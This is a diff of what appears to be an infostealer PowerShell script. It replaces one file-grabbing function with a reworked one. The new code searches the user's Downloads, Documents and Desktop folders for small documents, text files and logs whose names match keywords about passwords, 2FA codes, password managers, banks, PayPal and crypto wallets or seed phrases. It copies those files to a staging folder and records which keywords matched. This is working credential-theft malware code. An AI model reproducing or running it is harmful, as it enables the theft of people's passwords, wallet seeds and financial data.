@@ -754,64 +754,37 @@ Pass: $decodedPass
     #}
     #ExportPrivateKeys
 
-    Function Invoke-GrabFiles {
-        $grabber = @(
-            "2fa",
-            "acc",
-            "atomic wallet",
-            "account",
-            "backup",
-            "bank",
-            "bitcoin",
-            "backupcode",
-            "bitwarden",
-            "bitcoin",
-            "code",
-            "coinbase",
-            "crypto",
-            "dashlane",
-            "default",
-            "discord",
-            "disk",
-            "eth",
-            "exodus",
-            "facebook",
-            "fb",
-            "funds",
-            "keepass",
-            "keepassxc",
-            "keys",
-            "lastpass",
-            "login",
-            "mail",
-            "memo",
-            "metamask",
-            "note",
-            "nordpass",
-            "pass",
-            "paypal",
-            "private",
-            "pw",
-            "recovery",
-            "remote",
-            "secret",
-            "passphrase",
-            "seedphrase",
-            "wallet seed",
-            "server",
-            "syncthing",
-            "smart contract",
-            "trading",
-            "token",
-            "wal",
-            "wallet"
-        )
-        $dest = $important_files
-        $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
-        [regex] $grab_regex = "(" + (($grabber | ForEach-Object { [regex]::escape($_) }) -join "|") + ")"
-        (Get-ChildItem -path $paths -Include @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")  -r | Where-Object Length -lt 1mb) -match $grab_regex | Copy-Item -Destination $dest -Force
+    function FilesGrabber {
+    $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
+    $keywords = @("2fa","atomic wallet","account","backup","bank","bitcoin","btc","backupcode","bitwarden","bitcoin","code","coinbase","crypto","dashlane","discord","eth","exodus","facebook","funds","keepass","keepassxc","keys","lastpass","login","mail","memo","metamask","note","nordpass","pass","paypal","private","pw","recovery","remote","secret","passphrase","seedphrase","wallet seed","server","syncthing","smart contract","trading","token","wallet")
+    $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
+    foreach ($path in $paths) {
+        $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
+            $_.Length -lt 1mb -and $_.Name -match ($keywords -join '|')
+        }
+        foreach ($file in $files) {
+            $destination = Join-Path -Path $important_files -ChildPath $file.Name
+            if ($file.FullName -ne $destination) {
+                Copy-Item -Path $file.FullName -Destination $destination -Force
+            }
+        }
     }
-    Invoke-GrabFiles
+	 # Send info about the keywords that match a grabbed file
+    $keywordsUsed = @()
+    foreach ($keyword in $keywords) {
+        foreach ($file in (Get-ChildItem -Path $important_files -Recurse)) {
+            if ($file.Name -like "*$keyword*") {
+                if ($file.Length -lt 1mb) {
+                    if ($keywordsUsed -notcontains $keyword) {
+						$keywordsUsed += $keyword
+                        $keywordsUsed | Out-File "$folder_general\Important_Files_Keywords.txt" -Force
+                    }
+                }
+            }
+        }
+    }
+    }
+    FilesGrabber
 
     Set-Location "$env:LOCALAPPDATA\Temp"
 
